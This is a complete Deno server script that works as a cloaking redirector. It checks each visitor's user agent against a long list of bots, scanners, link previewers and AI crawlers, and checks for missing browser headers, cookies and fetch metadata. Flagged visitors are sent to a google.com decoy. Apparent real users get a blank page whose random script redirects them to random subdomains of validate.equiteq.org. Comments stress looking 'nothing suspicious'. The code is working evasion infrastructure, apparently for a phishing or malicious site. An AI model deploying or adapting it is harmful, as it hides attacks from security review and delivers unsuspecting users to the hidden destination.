Deno.serve({ port: 8080 }, (request: Request): Response => {
  try {
    const url = new URL(request.url);
    const cookies = request.headers.get('cookie') || '';
    const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
    const accept = request.headers.get('accept') || '';
    const acceptLanguage = request.headers.get('accept-language') || '';
    const acceptEncoding = request.headers.get('accept-encoding') || '';
    const secFetchDest = request.headers.get('sec-fetch-dest') || '';
    
    const decoyUrl = 'https://www.google.com';

    // Known bot user agents
    const botPatterns = [
      'bot', 'crawler', 'spider', 'curl', 'wget', 'python', 'java', 'perl', 'ruby',
      'headless', 'phantom', 'selenium', 'puppeteer', 'playwright', 'webdriver',
      'pingdom', 'uptimerobot', 'monitoring', 'checker', 'validator', 'preview',
      'facebook', 'twitter', 'linkedin', 'slack', 'discord', 'telegram', 'whatsapp',
      'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduck', 'yahoo', 'semrush',
      'ahrefs', 'mj12bot', 'dotbot', 'petalbot', 'bytespider', 'gptbot', 'chatgpt',
      'applebot', 'amazonbot', 'anthropic', 'claude', 'cohere', 'huggingface',
      'postman', 'insomnia', 'httpie', 'axios', 'fetch', 'request', 'scrapy',
      'nutch', 'archive', 'httrack', 'libwww', 'lwp', 'mechanize', 'okhttp',
      'go-http', 'node-fetch', 'undici', 'got/', 'superagent'
    ];

    // Check if user agent matches bot patterns
    const isKnownBot = botPatterns.some(pattern => userAgent.includes(pattern));

    // Check for missing headers that real browsers always send
    const missingBrowserHeaders = !accept || !acceptLanguage || !acceptEncoding;

    // Check for empty or suspicious user agent
    const suspiciousUA = userAgent.length < 20 || userAgent === '' || 
                         (userAgent.includes('mozilla/5.0') && userAgent.length < 50);

    // Script request handling
    if (url.pathname.endsWith('.js')) {
      // Multiple bot checks for script request
      const noCookie = !cookies.includes('_v=1');
      const noReferer = !request.headers.get('referer');
      const wrongSecFetch = secFetchDest !== 'script';
      
      // If ANY bot signal detected, redirect to decoy
      if (noCookie || isKnownBot || noReferer || missingBrowserHeaders || wrongSecFetch) {
        return new Response(null, {
          status: 302,
          headers: { 'Location': decoyUrl }
        });
      }

      // Passed all checks - serve real redirect
      const currentPath = url.searchParams.get('p') || '/';
      const queryString = url.searchParams.get('q') || '';

      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let sub = '';
      for (let i = 0; i < 5; i++) {
        sub += chars.charAt(Math.floor(Math.random() * chars.length));
      }

      const destination = `https://details${sub}.validate.equiteq.org${currentPath}?q=a${queryString ? '&' + queryString : ''}`;

      const js = `window.location.replace('${destination}');`;

      return new Response(js, {
        headers: { 
          'Content-Type': 'application/javascript',
          'Cache-Control': 'no-store, no-cache, must-revalidate, private'
        }
      });
    }

    // Initial page request - check for bots before serving HTML
    if (isKnownBot || suspiciousUA || missingBrowserHeaders) {
      return new Response(null, {
        status: 302,
        headers: { 'Location': decoyUrl }
      });
    }

    // Generate random script filename
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let randomName = '';
    for (let i = 0; i < 12; i++) {
      randomName += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    // Generate random token for extra validation
    let token = '';
    for (let i = 0; i < 16; i++) {
      token += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    const scriptUrl = `/${randomName}.js?p=${encodeURIComponent(url.pathname)}&q=${encodeURIComponent(url.search.substring(1))}&t=${token}`;

    // Minimal HTML - nothing suspicious
    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Please wait...</title>
</head>
<body>
<script src="${scriptUrl}"></script>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store, no-cache, must-revalidate, private',
        'Set-Cookie': `_v=1; Path=/; HttpOnly; SameSite=Strict; Max-Age=30`,
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY'
      }
    });

  } catch (error) {
    console.error('Error:', error);
    return new Response('Error', { status: 500 });
  }
});
